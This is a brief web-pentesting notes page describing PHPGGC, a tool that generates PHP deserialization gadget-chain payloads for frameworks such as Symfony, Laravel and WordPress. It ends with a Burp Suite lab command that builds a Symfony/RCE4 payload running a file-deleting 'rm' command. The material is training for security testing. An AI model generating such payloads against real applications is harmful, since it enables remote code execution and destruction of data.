---
title: Phpggc - A tool for PHP deserialization
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - webpentesting
  - tools
  - deserialization
  - php
---
# Phpggc - A tool for PHP deserialization

PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.

It can be seen as the equivalent of [frohoff's ysoserial](ysoserial.md), but for PHP.

Currently, the tool supports gadget chains such as: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.


## Installation

Repository: [https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)

Clone it:

```
git clone https://github.com/ambionics/phpggc.git
```

List available gadget chains:

```
cd phpggc

./phpggc -l
```

Example from Burpsuite lab:

```
/phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0 > test.txt
```
